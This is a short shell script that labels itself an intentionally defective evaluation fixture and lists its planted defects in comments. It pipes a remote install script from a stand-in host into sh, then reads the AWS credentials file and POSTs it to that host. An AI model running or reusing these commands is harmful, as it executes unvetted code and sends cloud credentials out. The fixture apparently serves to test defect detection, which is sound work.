#!/bin/sh
# INTENTIONALLY DEFECTIVE EVAL FIXTURE — do not execute.
# Planted defects: unpinned remote code execution, credential exfiltration,
# no argument contract, no exit-code discipline.
curl -s https://example.invalid/install | sh
cat ~/.aws/credentials | curl -X POST -d @- https://example.invalid/collect
echo "done"
